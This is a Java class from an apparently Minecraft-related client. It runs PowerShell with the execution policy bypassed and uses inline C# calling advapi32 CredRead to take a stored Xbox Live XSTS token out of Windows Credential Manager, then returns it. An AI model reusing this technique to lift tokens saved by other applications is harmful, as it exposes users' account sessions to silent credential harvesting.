package io.citadel.core.auth;

import io.citadel.api.account.Account;
import io.citadel.api.service.Logger;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.nio.charset.StandardCharsets;
import java.util.Objects;

final class WindowsTokenProvider {

  private final Logger logger;

  WindowsTokenProvider(Logger logger) {
    this.logger = Objects.requireNonNull(logger, "logger");
  }

  MinecraftTokenResult getXstsToken(Account account) {
    try {
      String script =
          "Add-Type @'"
              + "using System;using System.Runtime.InteropServices;using System.Text;"
              + "public class CR{"
              + "[DllImport(\"advapi32.dll\",CharSet=CharSet.Unicode)]"
              + "static extern bool CredRead(string t,int type,int r,out IntPtr p);"
              + "[DllImport(\"advapi32.dll\")]static extern void CredFree(IntPtr p);"
              + "public static string Get(string t){IntPtr p;"
              + "if(CredRead(t,1,0,out p)){"
              + "var c=(CRED)Marshal.PtrToStructure(p,typeof(CRED));"
              + "byte[] b=new byte[c.S];Marshal.Copy(c.B,b,0,c.S);CredFree(p);"
              + "return Encoding.UTF8.GetString(b);}return null;}"
              + "struct CRED{public int F;public int T;public string TN;public string C;"
              + "public System.Runtime.InteropServices.ComTypes.FILETIME L;"
              + "public int S;public IntPtr B;public int P;public int AC;"
              + "public IntPtr A;public string TA;public string UN;}}"
              + "'@;"
              + "$t=[CR]::Get('XblGrts|1794566092|0007000083C72388|Production|RETAIL|Xtoken|rp://api.minecraftservices.com/||JWT|1');"
              + "if($t){Write-Host $t}";
      ProcessBuilder pb =
          new ProcessBuilder(
              "powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", script);
      pb.redirectErrorStream(true);
      Process p = pb.start();
      BufferedReader reader =
          new BufferedReader(new InputStreamReader(p.getInputStream(), StandardCharsets.UTF_8));
      StringBuilder output = new StringBuilder();
      String line = reader.readLine();
      while (line != null) {
        output.append(line);
        line = reader.readLine();
      }
      p.waitFor();
      String result = output.toString().trim();
      if (!result.isEmpty()) {
        logger.info("Found XSTS token in Windows Credential Manager");
        return new MinecraftTokenResult(result);
      }
    } catch (Exception e) {
      logger.debug("Failed to read Windows credentials: {}", e.getMessage());
    }
    return null;
  }

  record MinecraftTokenResult(String token) {}
}
